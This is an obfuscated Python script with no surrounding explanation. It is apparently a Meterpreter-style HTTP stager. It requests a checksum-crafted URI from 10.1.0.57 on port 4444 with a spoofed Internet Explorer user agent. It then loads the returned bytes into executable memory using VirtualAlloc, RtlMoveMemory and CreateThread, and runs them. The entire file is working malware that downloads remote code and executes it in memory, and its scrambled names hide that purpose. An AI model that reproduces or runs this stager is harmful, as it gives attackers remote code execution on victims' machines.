import urllib.request, string, random, ctypes as gZKDXM
def aSQxBGVWiCz(s):
	return sum([ord(ch) for ch in s]) % 0x100
def FuWpaHMvQmDeofS():
	for x in range(64):
		wXmxQWw = ''.join(random.sample(string.ascii_letters + string.digits,3))
		xKiQgFt = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
		for mZTCDXGhY in xKiQgFt:
			if aSQxBGVWiCz(wXmxQWw + mZTCDXGhY) == 92: return wXmxQWw + mZTCDXGhY
def vrRwDFspLWspfBG(FbkGIPc, YxraTagt):
	cyQWWfrh = urllib.request.ProxyHandler({})
	NRzEiMC = urllib.request.build_opener(cyQWWfrh)
	urllib.request.install_opener(NRzEiMC)
	CZjpbc = urllib.request.Request("http://" + FbkGIPc + ":" + str(YxraTagt) + "/" + FuWpaHMvQmDeofS(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
	try:
		lFPyHncOuc = urllib.request.urlopen(CZjpbc)
		try:
			if int(lFPyHncOuc.info()["Content-Length"]) > 100000: return lFPyHncOuc.read()
			else: return ''
		except: return lFPyHncOuc.read()
	except urllib.request.URLError:
		return ''
def GznBOupeyjF(tbJbiZIU):
	if tbJbiZIU != "":
		PWvYGcD = bytearray(tbJbiZIU)
		lMaOFtGChXakyN = gZKDXM.windll.kernel32.VirtualAlloc(gZKDXM.c_int(0),gZKDXM.c_int(len(PWvYGcD)), gZKDXM.c_int(0x3000),gZKDXM.c_int(0x40))
		KSWEtBTjFbxrAsP = (gZKDXM.c_char * len(PWvYGcD)).from_buffer(PWvYGcD)
		gZKDXM.windll.kernel32.RtlMoveMemory(gZKDXM.c_int(lMaOFtGChXakyN),KSWEtBTjFbxrAsP, gZKDXM.c_int(len(PWvYGcD)))
		QrGSbzLsls = gZKDXM.windll.kernel32.CreateThread(gZKDXM.c_int(0),gZKDXM.c_int(0),gZKDXM.c_int(lMaOFtGChXakyN),gZKDXM.c_int(0),gZKDXM.c_int(0),gZKDXM.pointer(gZKDXM.c_int(0)))
		gZKDXM.windll.kernel32.WaitForSingleObject(gZKDXM.c_int(QrGSbzLsls),gZKDXM.c_int(-1))
kaJcrkLkalPpRDz = ''
kaJcrkLkalPpRDz = vrRwDFspLWspfBG("10.1.0.57", 4444)
GznBOupeyjF(kaJcrkLkalPpRDz)
